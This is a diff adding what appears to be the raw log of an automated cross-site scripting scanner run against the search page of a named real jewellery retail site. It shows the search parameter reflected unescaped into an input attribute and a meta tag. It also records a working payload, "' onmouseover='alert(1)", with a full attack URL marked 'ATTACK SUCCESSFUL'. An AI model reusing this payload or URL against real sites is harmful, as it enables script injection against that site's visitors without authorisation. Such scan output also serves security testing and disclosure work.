@@ -1,0 +1,40 @@
+https://www.inspiredsilver.com/c6_wedding-sets.html
+
+GET Params:[1]
+['q']
+_______________________________________________________________________________________________________
+https://www.inspiredsilver.com/search/?q=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input id="search" type="text" name="q" value="(uvw&quot;xyz'yxz&lt;/zxy" class="input-text searchspring-query" autocomplete="off" maxlength="128" />
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [1]
+<meta property="og:url" content="https://www.inspiredsilver.com/search/?q=(uvw%22xyz'yxz%3C/zxy" />
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.inspiredsilver.com/search/?q=' onmouseover='alert(1)
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input id="search" type="text" name="q" value="' onmouseover='alert(1)" class="input-text searchspring-query" autocomplete="off" maxlength="128" />
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
